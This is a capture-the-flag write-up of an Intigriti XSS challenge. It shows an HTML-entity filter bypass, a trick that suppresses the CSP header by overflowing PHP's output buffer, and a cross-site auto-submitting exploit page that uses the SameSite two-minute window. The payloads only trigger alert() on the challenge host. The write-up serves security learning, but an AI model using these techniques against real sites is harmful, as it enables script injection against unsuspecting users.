
```
$stringa='/[(\`\)]/';
$variabile=preg_replace($stringa,'NotAllowedCaracter',$YourPayload);
```
+ we are not allowed to use brackets nor backticks. However, we are able to bypass this by encoding these characters using HTML entities
+ payload: <img src=x onerror=alert&lpar;1&rpar;>.
+ next problem : csp
`content-security-policy: default-src 'none'; style-src 'nonce-5e05f7032c49f6f9667962037c1c8ca18115c037'; script-src 'nonce-5e05f7032c49f6f9667962037c1c8ca18115c037'; img-src 'self'`
![image](https://github.com/av4nth1ka/Intigriti-XSS-challenges/assets/80388135/262edd23-d537-431e-b890-99a250b258e5)
+ The policy looks mostly correct as we cannot inject arbitrary <script> tags since a valid nonce is required each time the page is requested. We are also unable to insert inline JavaScript events such as onload, onerror, etc. since there is a lack of unsafe-inline
+ Even though we can use base tag, the webpage is not importing any kinds of javascript files at all.
+ ![image](https://github.com/av4nth1ka/Intigriti-XSS-challenges/assets/80388135/aec86427-37ca-4ba3-a17d-5134f17cb3f8)
+ token is set to a 64-character string, FirstText and Hashing are set based on our input. After testing around for abit, I found that:

token accepts any arbitrary string as long as it is exactly 64-characters long
PHPSESSID cookie has to be present and the value can be any string of at least 1-character long
+ The bug here is that the application’s response/output will not be sent first, but the header should. The body data request will be sent to the output buffer before the HTTP header since there’s no data returned before the header. This means the CSP inside the header will be ignored if we provide enough data more than the default PHP output_buffer size (4096 bytes), and sbox parameter is the perfect spot for the attacker to control to trigger the error.
+ Now we’ll try to populate the parameters with a junk buffer data so that the CSP header would be ignored.
![image](https://github.com/av4nth1ka/Intigriti-XSS-challenges/assets/80388135/52a2d66a-fd19-46b1-8cac-fe141dad140e)

+ The content-security-policy header is no longer returned in the response header for the second request. This means that our XSS payload would work!
+ The following should be hosted in a attacker controlled domain.
```
<html>
  <body>
	<script>
		function submit() {
			document.forms[0].submit();
		}
		
		function exploit() {
			var newTab = window.open("https://challenge-0322.intigriti.io/challenge/LoveSender.php", "_blank");
			setTimeout(submit, 5000);
		}
	</script>

	<button onclick='exploit()'>Click me</button>
    <form action="https://challenge-0322.intigriti.io/challenge/LoveReceiver.php" method="POST">
      <input type="hidden" name="token" value="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" />
      <input type="hidden" name="FirstText" value="&lt;img&#32;src&#61;&quot;happy&#46;gif&quot;&#32;onload&#61;alert&amp;lpar&#59;document&#46;domain&amp;rpar&#59;&gt;" />
      <input type="hidden" name="Hashing" value="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" />
    </form>
  </body>
</html>
```
+ This relies on user interaction as they would need to click on the “Click me” button first. By doing so, the JavaScript in this file would open a new tab to the https://challenge-0322.intigriti.io/challenge/LoveSender.php page (the landing page containing the form). This step is essential as visiting this page would grant the victim a valid PHPSESSID cookie, which is required by the LoveReceiver.php page (vulnerable page) before the XSS payload would even load.
+ Important: `Furthermore, the PHPSESSID cookie was set without the SameSite attribute. This means that modern browsers such as Chrome and FireFox would implement a 2-minute buffer window before setting this attribute as SameSite=Lax.`
+ Once a valid PHPSESSID cookie is obtained, we have 2 minutes before the SameSite=Lax setting kicks in, preventing cross-site POST requests from sending cookies. Now we have to quickly send our POST request to trigger the XSS payload. The HTML file above automatically sends this POST request after a 5-second delay (to ensure that the new cookie from the opened tab is processed). When the request is sent successfully, the XSS should trigger in the victim’s context.

